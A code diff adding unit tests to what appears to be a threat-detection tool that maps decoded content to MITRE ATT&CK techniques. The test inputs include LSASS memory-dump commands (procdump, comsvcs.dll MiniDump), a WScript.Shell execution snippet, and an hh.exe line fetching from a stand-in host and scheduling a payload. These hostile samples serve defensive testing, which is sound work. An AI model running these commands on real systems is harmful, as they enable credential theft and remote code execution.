@@ -8,11 +8,33 @@ technique the catalog does not carry (which would be silently dropped).
 
 import re
 
+from titan_decoder.core.detection_rules import CorrelationRulesEngine
 from titan_decoder.threat_intel import ThreatIntelligenceEngine
 from titan_decoder.threat_intel.catalog import load_attack_catalog
 from titan_decoder.threat_intel.lolbins import DEFAULT_LOLBIN_RULES
 
 _ID_PATTERN = re.compile(r"^T\d{4}(?:\.\d{3})?$")
+
+# Catalog entries deliberately carried without a built-in producer: they are
+# reportable only through rule-pack `attack_ids`. T1071 (Application Layer
+# Protocol) cannot be evidenced deterministically from decoded content alone,
+# and T1204 is the parent-level form packs can use when the user-execution
+# vector is unknown (built-ins attribute the specific T1204.002). Adding an
+# entry here must be a deliberate decision, mirrored in
+# docs/THREAT_INTELLIGENCE.md.
+RULE_PACK_ONLY_TECHNIQUES = frozenset({"T1071", "T1204"})
+
+
+def _builtin_producer_ids() -> set:
+    ids = {
+        technique_id
+        for technique_id, _pattern, _name in ThreatIntelligenceEngine.BEHAVIOR_RULES
+    }
+    for rule in DEFAULT_LOLBIN_RULES:
+        ids.update(rule.technique_ids)
+    for rule in CorrelationRulesEngine().rules:
+        ids.update(rule.attack_ids)
+    return ids
 
 
 def test_catalog_ids_unique_and_well_formed():
@@ -55,6 +77,32 @@ def test_lolbin_rule_techniques_exist_in_catalog():
             )
 
 
+def test_every_catalog_technique_has_a_producer_or_is_rule_pack_only():
+    """No silent orphans: every catalog entry must be producible by a
+    behavior rule, LOLBin rule, or built-in detection attack_ids, unless it
+    is explicitly designated rule-pack-only above."""
+    catalog_ids = set(load_attack_catalog()["by_id"])
+    producers = _builtin_producer_ids()
+    orphans = catalog_ids - producers - RULE_PACK_ONLY_TECHNIQUES
+    assert not orphans, (
+        f"catalog techniques with no producer: {sorted(orphans)} — wire a "
+        "rule or add them to RULE_PACK_ONLY_TECHNIQUES deliberately"
+    )
+
+
+def test_rule_pack_only_list_is_accurate():
+    """Entries in the rule-pack-only list must exist in the catalog and must
+    genuinely lack a built-in producer, so the list cannot go stale."""
+    catalog_ids = set(load_attack_catalog()["by_id"])
+    producers = _builtin_producer_ids()
+    for technique_id in RULE_PACK_ONLY_TECHNIQUES:
+        assert technique_id in catalog_ids, f"{technique_id} not in catalog"
+        assert technique_id not in producers, (
+            f"{technique_id} now has a built-in producer; remove it from "
+            "RULE_PACK_ONLY_TECHNIQUES"
+        )
+
+
 def _techniques_for(preview: str) -> set:
     report = {"nodes": [{"id": 0, "content_preview": preview}]}
     result = ThreatIntelligenceEngine().analyze(report)
@@ -95,6 +143,44 @@ def test_hh_and_at_require_exe_suffix():
     fired = _techniques_for("hh.exe http://evil.test/a.chm && at.exe 12:00 payload")
     assert "T1218.001" in fired
     assert "T1053.002" in fired
+
+
+def test_lsass_dump_maps_lsass_memory_subtechnique():
+    fired = _techniques_for("procdump -ma lsass.exe lsass.dmp")
+    assert {"T1003", "T1003.001"} <= fired
+    fired = _techniques_for("rundll32 comsvcs.dll, MiniDump 624 c:\\l.dmp full")
+    assert "T1003.001" in fired
+
+
+def test_jscript_execution_maps_javascript_subtechnique():
+    assert "T1059.007" in _techniques_for(
+        'var sh = new ActiveXObject("WScript.Shell"); sh.Run(cmd);'
+    )
+    # Prose about web JavaScript must not fire.
+    assert "T1059.007" not in _techniques_for(
+        "Use JavaScript to validate the signup form before submitting."
+    )
+
+
+def test_ransom_note_maps_data_encrypted_for_impact():
+    assert "T1486" in _techniques_for(
+        "ALL YOUR FILES ARE LOCKED. Pay to receive the decryptor and "
+        "recover your files."
+    )
+    # Encryption-at-rest prose is not ransom evidence.
+    assert "T1486" not in _techniques_for(
+        "Backup files are encrypted at rest per the security policy."
+    )
+
+
+def test_spearphish_attachment_maps_from_mime_headers():
+    assert "T1566.001" in _techniques_for(
+        'Content-Disposition: attachment; filename="invoice_2026.docm"'
+    )
+    # A benign attachment type must not fire.
+    assert "T1566.001" not in _techniques_for(
+        'Content-Disposition: attachment; filename="quarterly-report.pdf"'
+    )
 
 
 def test_benign_prose_produces_no_techniques():
